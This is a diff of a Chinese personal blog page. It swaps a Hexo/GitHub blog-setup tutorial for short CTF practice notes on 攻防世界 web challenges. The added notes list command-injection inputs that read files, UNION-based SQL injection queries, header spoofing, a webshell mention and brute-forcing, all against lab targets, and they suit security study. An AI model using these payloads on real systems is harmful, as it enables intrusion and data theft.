@@ -22,7 +22,7 @@
     <meta name="description" content="记录一个小白的成长">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Hexo+Github搭建个人博客 · RegenbogenLJ&#39;s Studio</title>
+    <title>攻防世界练习 · RegenbogenLJ&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >RegenbogenLJ&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Hexo+Github搭建个人博客</a>
+                <a href="#" class="post-name">攻防世界练习</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Hexo+Github搭建个人博客
+            攻防世界练习
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "blog">blog</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.7k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">546</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/06/18</span>
+                    <span class="post-intro-time">2020/03/10</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,63 +401,21 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近我终于实现了自己很久之前关于搭建自己专属的博客网站的目标，现在把搭建期间的过程和走过的坑记录下来，如果你对搭建自己的网站有兴趣，不妨可以参考一下我的文章。</p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>1.安装Node.js: <a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">Node.js安装包下载地址</a>，安装时一直点next即可。<br>2.安装Git: <a href="https://git-scm.com/downloads" target="_blank" rel="noopener">Git安装包下载地址</a>,安装时一直点next即可。<br>3.安装Hexo:键入命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+        <h1 id="新手练习区"><a href="#新手练习区" class="headerlink" title="新手练习区"></a>新手练习区</h1><h2 id="0x01-简单的php"><a href="#0x01-简单的php" class="headerlink" title="0x01 简单的php"></a>0x01 简单的php</h2><p>查看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line">$a=@$_GET[&apos;a&apos;];</span><br><span class="line">$b=@$_GET[&apos;b&apos;];</span><br><span class="line">if($a==0 and $a)&#123;</span><br><span class="line">    echo $flag1;</span><br><span class="line">&#125;</span><br><span class="line">if(is_numeric($b))&#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">if($b&gt;1234)&#123;</span><br><span class="line">    echo $flag2;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>至此Hexo的环境就搭建好了。</p>
-<h1 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h1><h2 id="初始化项目-1"><a href="#初始化项目-1" class="headerlink" title="初始化项目"></a>初始化项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init myblog</span><br><span class="line"><span class="built_in">cd</span> myblog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
+<p>分析：a ==0,b不能为纯数字和纯数字字符串那我们构造a=‘0’&amp;b=1235a<br>绕过</p>
+<h2 id="0x02-xff-referer"><a href="#0x02-xff-referer" class="headerlink" title="0x02 xff_referer"></a>0x02 xff_referer</h2><p><a href="https://blog.csdn.net/Xionghuimin/article/details/103216586" target="_blank" rel="noopener">参考</a><br>先构造<br><code>X-Forwarded-For: 123.123.123.123</code><br>再加上<br><code>Referer:https://www.google.com</code></p>
+<h2 id="0x03-webshell"><a href="#0x03-webshell" class="headerlink" title="0x03 webshell"></a>0x03 webshell</h2><p>一句话木马直接上菜刀</p>
+<h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p><code>127.0.0.1&amp;&amp;ls</code>发现只有index.php<br><code>127.0.0.1&amp;&amp;find / -name &quot;*.txt&quot;</code>找到flag的路径<br><code>127.0.0.1&amp;&amp;cat /home/flag.txt</code></p>
+<h1 id="高手进阶区"><a href="#高手进阶区" class="headerlink" title="高手进阶区"></a>高手进阶区</h1><h2 id="0x01-baby-web"><a href="#0x01-baby-web" class="headerlink" title="0x01 baby_web"></a>0x01 baby_web</h2><p>用bp抓包，首页改成index.php<br><img src="/images/2020-2-29/1.png" alt></p>
+<h2 id="0x02-Training-WWW-Robots"><a href="#0x02-Training-WWW-Robots" class="headerlink" title="0x02 Training-WWW-Robots"></a>0x02 Training-WWW-Robots</h2><p>1.查看robots.txt。关于robots<br><img src="/images/2020-2-29/2.png" alt><br>2.查看fl0g.php得flag。</p>
+<h2 id="0x03-php-rce"><a href="#0x03-php-rce" class="headerlink" title="0x03 php_rce"></a>0x03 php_rce</h2><h2 id="0x05-NewsCenter"><a href="#0x05-NewsCenter" class="headerlink" title="0x05 NewsCenter"></a>0x05 NewsCenter</h2><p>1.用 <code>&#39; and 0 union select 1,2,3 #</code>来初步判断该sql查询返回数据<br><img src="/images/2020-2-29/3.png" alt><br>2.用 <code>&#39; and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #</code>得到表名，发现 secret_table 表。<br><img src="/images/2020-2-29/4.png" alt><br>3.用 <code>&#39; and 0 union select 1,column_name,data_type from information_schema.columns where table_name=&#39;secret_table&#39;#</code>得到 secret_table 表的列名以及数据类型。<br><img src="/images/2020-2-29/5.png" alt><br>4.最后得到flag。<br><code>&#39; and 0 union select 1,2,fl4g from secret_table #</code><br><img src="/images/2020-2-29/6.png" alt></p>
+<h2 id="0x07-NaNNaNNaNNaN-Batman"><a href="#0x07-NaNNaNNaNNaN-Batman" class="headerlink" title="0x07  NaNNaNNaNNaN-Batman"></a>0x07  NaNNaNNaNNaN-Batman</h2><p>1.文件下载之后打开发现是html文件，但是乱码了，改后缀名为.html并在浏览器中打开。<br><img src="/images/2020-2-29/11.png" alt><br>发现eval函数，将eval函数改成alert，再次打开就会弹出源代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function $()&#123;</span><br><span class="line">var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line">    if(e.match(/^be0f23/)!=null)</span><br><span class="line">      if(e.match(/233ac/)!=null)if(e.match(/e98aa$/)!=null)</span><br><span class="line">        if(e.match(/c7be9/)!=null)&#123;</span><br><span class="line">            var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">            var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">            var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">            var i=[&quot;it&apos;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">            var s=[t,n,r,i];</span><br><span class="line">            for(var o=0;o&lt;13;++o)&#123;</span><br><span class="line">                document.write(s[o%4][0]);s[o%4].splice(0,1)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">document.write(&apos;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&apos;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/2019-6-18/40.png" alt></p>
-<h2 id="初始化之后目录："><a href="#初始化之后目录：" class="headerlink" title="初始化之后目录："></a>初始化之后目录：</h2><p>.<br>├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── source<br> |   ├── _drafts<br> |   └── _posts<br>└── themes<br><strong>_config.yml</strong>：网站的配置信息.。<br><strong>package.json</strong>：应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，可以自由移除。<br><strong>scaffolds</strong>：模版文件夹。当新建文章时，Hexo 会根据 scaffold 来建立文件。Hexo的模板是指在新建的markdown文件中默认填充的内容。例如，如果修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。<br><strong>source</strong>：资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。<br><strong>themes</strong>：主题 文件夹。Hexo 会根据主题来生成静态页面。</p>
-<h2 id="本地开启调试服务"><a href="#本地开启调试服务" class="headerlink" title="本地开启调试服务"></a>本地开启调试服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/2019-6-18/41.png" alt></p>
-<p>然后打开浏览器访问<a href="http://localhost:4000即可" target="_blank" rel="noopener">http://localhost:4000即可</a><br><img src="/images/2019-6-18/42.png" alt></p>
-<h2 id="写一篇文章"><a href="#写一篇文章" class="headerlink" title="写一篇文章"></a>写一篇文章</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">"welcome-to-myblog"</span> //引号里面是文章名</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/2019-6-18/43.png" alt><br>用sublime打开项目<br><img src="/images/2019-6-18/44.png" alt><br>找到对应的文章编辑即可。<br>回到控制台</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/2019-6-18/45.png" alt><br>再次开启服务 </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-<p>(牢记着三个命令，后面经常会用到)成功后在浏览器访问。<br><img src="/images/2019-6-18/46.png" alt></p>
-<h1 id="搭建自己喜欢的blog"><a href="#搭建自己喜欢的blog" class="headerlink" title="搭建自己喜欢的blog"></a>搭建自己喜欢的blog</h1><h2 id="换主题"><a href="#换主题" class="headerlink" title="换主题"></a>换主题</h2><p>换不同的主题可以去网上找，这里我以archer为例，默认的是landscape。<a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="noopener">地址</a><br>参考该地址安装，在Hexo目录下执行，执行完会发现themes目录多了archer文件夹。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-generator-json-content --save &amp;&amp; npm i --save hexo-wordcount &amp;&amp; git <span class="built_in">clone</span> https://github.com/fi3ework/hexo-theme-archer.git themes/archer --depth=1</span><br></pre></td></tr></table></figure>
-
-<p>修改Hexo目录下的 _config.yml 的 theme 字段为 archer</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: archer</span><br></pre></td></tr></table></figure>
-
-<p>添加sidebar启用支持：<br>在Hexo目录下的 _config.yml 中添加以下字段（不是archer下的 _config.yml）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">jsonContent:</span><br><span class="line">    meta: true</span><br><span class="line">    pages: false</span><br><span class="line">    posts:</span><br><span class="line">    title: true</span><br><span class="line">    date: true</span><br><span class="line">    path: true</span><br><span class="line">    text: false</span><br><span class="line">    raw: false</span><br><span class="line">    content: false</span><br><span class="line">    slug: false</span><br><span class="line">    updated: false</span><br><span class="line">    comments: false</span><br><span class="line">    link: false</span><br><span class="line">    permalink: true</span><br><span class="line">    excerpt: false</span><br><span class="line">    categories: true</span><br><span class="line">    tags: true</span><br></pre></td></tr></table></figure>
-
-<p>如下图所示<br><img src="/images/2019-6-18/47.png" alt><br>其他字段参考上述链接进行修改。<br>之后修改themes里的_config.yml，根据自己的实际情况修改图片、站点名称、联系方式等信息。若不需要版权信息，将true改为false即可。<br><img src="/images/2019-6-18/48.png" alt><br>修改完可以进行本地测试一下了。<br>在控制台依次输入</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-<p>效果如下：<br><img src="/images/2019-6-18/49.png" alt></p>
-<h2 id="文章标签和目录"><a href="#文章标签和目录" class="headerlink" title="文章标签和目录"></a>文章标签和目录</h2><p>点开上张图片左上角的箭头<br><img src="/images/2019-6-18/50.png" alt>此时文章的标签和目录都是空的。<br>先去控制台新建一篇文章，参考三、初始化项目里的写文章，<br><img src="/images/2019-6-18/44.png" alt></p>
-<p>发现有tags,但是没有categories,找到图中目录加上最后一行即可。</p>
-<p><img src="/images/2019-6-18/51.png" alt></p>
-<p>改完之后保存依此运行三条命令：<code>hexo clean、 hexo g、 hexo s</code>，再新建一篇文章，发现多了categories<br><img src="/images/2019-6-18/52.png" alt><br>测试一下成功没，执行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-<p>效果如下：<br><img src="/images/2019-6-18/53.png" alt><br>写文章参考markdown语法进行写作。</p>
-<h2 id="加本地图片"><a href="#加本地图片" class="headerlink" title="加本地图片"></a>加本地图片</h2><p>写博客当然要图片啦，此处没有采用图床，听说图床不够稳定，所以采用本地图片。<br>1)将主页配置文件_config.yml 里的post_asset_folder:这个选项设置为true；<br>2)在hexo目录下执行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>
-
-<p>这是下载安装一个可以上传本地图片的插件。</p>
-<p>3)再运行hexo n “xxxx”来生成md博文时，/source/_posts文件夹内除了xxxx.md文件还有一个同名的文件夹。<br>4)最后在xxxx.md中想引入图片时，先把图片复制到xxxx这个文件夹中，然后只需要在xxxx.md中按照markdown的格式引入图片：</p>
-<pre><code>![你想输入的替代文字](xxxx/图片名.jpg)</code></pre><p>注意： xxxx是这个md文件的名字，也是同名文件夹的名字。只需要有文件夹名字即可，不需要有什么绝对路径。你想引入的图片就只需要放入xxxx这个文件夹内就好了，很像引用相对路径。</p>
-<p>5)最后检查一下，hexo g生成页面后，进入public\2019\02\26\index.html文件中查看相关字段，可以发现，html标签内的语句是<code>&lt;img src=&quot;2019/02/26/xxxx/图片名.jpg&quot;&gt;</code>，而不是&lt;img src=”xxxx/图片名.jpg&gt;。<br>其实直接在本地source中建立imges文件夹(图片放在/source/images即可)<br>&lt;img src=”img/图片名.jpg&gt;<br>这个比较方便，我就是使用的这种。</p>
-<h1 id="部署到github"><a href="#部署到github" class="headerlink" title="部署到github"></a>部署到github</h1><p>本地测试没有问题之后，就可以部署到github了。</p>
-<h2 id="注册github并创建仓库"><a href="#注册github并创建仓库" class="headerlink" title="注册github并创建仓库"></a>注册github并创建仓库</h2><p>注册很简单，有问题可以找度娘。<br>创建仓库<br><img src="/images/2019-6-18/54.png" alt><br>直接在桌面右键选择git bash here<br>在命令行中输入下面命令<br>ssh-keygen -t rsa -C “你的邮箱地址”<br>然后回车，要输入密码。<br>Your identification has been saved in /c/Users/you/.ssh/id_rsa.<br>Your public key has been saved in /c/Users/you/.ssh/id_rsa.pub.<br>The key fingerprint is:01:0f:f4:3b:ca:85:d6:17:a1:7d:f0:68:9d:f0:a2:db <a href="mailto:your_email@example.com" target="_blank" rel="noopener">your_email@example.com</a></p>
-<p>当你看到上面这段代码的时候，那就说明，你的 SSH key 已经创建成功，你只需要添加到github的SSH key上就可以了。windows打开C:\Users\用户名（电脑设置的账户）.ssh下面的id_rsa.pub,然后复制里面的所有内容.<br>找到settings,点击SSH，然后new一个<br><img src="/images/2019-6-18/55.png" alt><br><img src="/images/2019-6-18/56.png" alt><br>Title根据需要自己填，KEY填入复制的内容。</p>
-<h2 id="部署到github-1"><a href="#部署到github-1" class="headerlink" title="部署到github"></a>部署到github</h2><p>修改博客的_config.yml,repo填入你自己的链接<br><img src="/images/2019-6-18/57.png" alt><br>在命令行找到网站根目录，执行 </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean </span><br><span class="line">hexo g </span><br><span class="line">hexo d //d就是deploy</span><br></pre></td></tr></table></figure>
-
-<p>然后发现仓库中就是你的博客了，浏览器访问https://你的github账户名.github.io</p>
-<h1 id="绑定自己的域名"><a href="#绑定自己的域名" class="headerlink" title="绑定自己的域名"></a>绑定自己的域名</h1><p>我是在阿里云买的域名，域名备案是一个有点漫长的过程，<br>需要创建一个CNAME文件，里面直接输入域名即可，放在博客根目录即可。<br>还有一个就是要去进行域名解析，记录类型选择CNAME。<br>然后再部署到github，这样就可以直接用域名访问了。<br>po一个我自己的<a href="http://regenbogenlj.top" target="_blank" rel="noopener">地址</a></p>
+<p>将如下代码拿到控制台运行即可获得flag。<br><img src="/images/2020-2-29/12.png" alt></p>
+<h2 id="0x13-ics-06"><a href="#0x13-ics-06" class="headerlink" title="0x13  ics-06"></a>0x13  ics-06</h2><p>1.直接去报表中心查看<br><img src="/images/2020-2-29/7.png" alt><br>本来以为是注入，但是没成功。<br>题目提醒有一处留下了痕迹，所以决定就遍历id。<br>2.用bp抓包爆破<br><img src="/images/2020-2-29/8.png" alt><br>得到id=2333。<br><img src="/images/2020-2-29/9.png" alt><br><img src="/images/2020-2-29/10.png" alt></p>
 
     </article>
     <!-- license  -->
@@ -467,16 +425,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/07/02/VLAN实验/" title= "VLAN 实验">
-                    <div class="nextTitle">VLAN 实验</div>
+                <a href= "/2020/03/10/功防世界练习笔记/" title= "功防世界练习笔记">
+                    <div class="nextTitle">功防世界练习笔记</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/06/18/photos/" title= "photos">
-                    <div class="prevTitle">photos</div>
+                <a href= "/2019/09/29/计算机网络知识体系及知识点/" title= "计算机网络知识体系及知识点">
+                    <div class="prevTitle">计算机网络知识体系及知识点</div>
                 </a>
             
         </li>
@@ -586,7 +544,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#初始化项目"><span class="toc-number">3.</span> <span class="toc-text">初始化项目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#初始化项目-1"><span class="toc-number">3.1.</span> <span class="toc-text">初始化项目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#初始化之后目录："><span class="toc-number">3.2.</span> <span class="toc-text">初始化之后目录：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地开启调试服务"><span class="toc-number">3.3.</span> <span class="toc-text">本地开启调试服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写一篇文章"><span class="toc-number">3.4.</span> <span class="toc-text">写一篇文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#搭建自己喜欢的blog"><span class="toc-number">4.</span> <span class="toc-text">搭建自己喜欢的blog</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#换主题"><span class="toc-number">4.1.</span> <span class="toc-text">换主题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文章标签和目录"><span class="toc-number">4.2.</span> <span class="toc-text">文章标签和目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#加本地图片"><span class="toc-number">4.3.</span> <span class="toc-text">加本地图片</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#部署到github"><span class="toc-number">5.</span> <span class="toc-text">部署到github</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注册github并创建仓库"><span class="toc-number">5.1.</span> <span class="toc-text">注册github并创建仓库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#部署到github-1"><span class="toc-number">5.2.</span> <span class="toc-text">部署到github</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绑定自己的域名"><span class="toc-number">6.</span> <span class="toc-text">绑定自己的域名</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#新手练习区"><span class="toc-number">1.</span> <span class="toc-text">新手练习区</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-简单的php"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 简单的php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-xff-referer"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 xff_referer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-webshell"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#command-execution"><span class="toc-number">1.4.</span> <span class="toc-text">command_execution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#高手进阶区"><span class="toc-number">2.</span> <span class="toc-text">高手进阶区</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-baby-web"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 baby_web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Training-WWW-Robots"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 Training-WWW-Robots</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-php-rce"><span class="toc-number">2.3.</span> <span class="toc-text">0x03 php_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-NewsCenter"><span class="toc-number">2.4.</span> <span class="toc-text">0x05 NewsCenter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-NaNNaNNaNNaN-Batman"><span class="toc-number">2.5.</span> <span class="toc-text">0x07  NaNNaNNaNNaN-Batman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-ics-06"><span class="toc-number">2.6.</span> <span class="toc-text">0x13  ics-06</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
